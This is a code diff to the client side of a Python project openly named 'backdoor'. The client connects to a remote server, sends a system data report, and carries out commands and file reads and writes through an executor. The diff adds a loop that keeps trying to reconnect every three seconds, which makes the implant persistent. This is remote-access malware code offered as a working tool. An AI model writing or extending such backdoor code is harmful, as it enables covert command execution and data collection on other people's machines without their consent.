@@ -1,8 +1,10 @@
 import socket
+import time
 
 from backdoor.command.executor import CommandExecutor
 from backdoor.files.io import FileReader, FileWriter
 from backdoor.files.processor import FileProcessor
+from backdoor.messages.exceptions import DisconnectedException
 from backdoor.messages.exchange.client import ClientExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.messages.protocol import SocketProtocol
@@ -17,6 +19,7 @@ class Client:
         self,
         messenger: SocketMessenger,
         exchanger: ClientExchangeMapper,
+        data_collector: SystemDataCollector,
         host: str = "localhost",
         port: int = 4567,
     ) -> None:
@@ -24,9 +27,18 @@ class Client:
         self.port = port
         self.messenger = messenger
         self.exchanger = exchanger
+        self.data_collector = data_collector
         self.server: ServerModel
 
     def run(self) -> None:
+        while True:
+            try:
+                self.__try_run()
+            except (ConnectionRefusedError, DisconnectedException):
+                # just keep trying to reconnect
+                time.sleep(3)
+
+    def __try_run(self) -> None:
         self.__establish_connection()
         self.__send_system_report()
 
@@ -34,8 +46,7 @@ class Client:
             self.exchanger.exchange(self.server)
 
     def __send_system_report(self) -> None:
-        collector = SystemDataCollector()
-        report = collector.collect_data()
+        report = self.data_collector.collect_data()
         self.messenger.send(self.server.sock, report)
 
     def __establish_connection(self) -> None:
@@ -53,7 +64,8 @@ def main() -> None:
     file_processor = FileProcessor(file_writer, file_reader)
     executor = CommandExecutor(file_processor)
     exchanger = ClientExchangeMapper(messenger, executor)
-    client = Client(messenger, exchanger)
+    data_collector = SystemDataCollector()
+    client = Client(messenger, exchanger, data_collector)
 
     client.run()
 
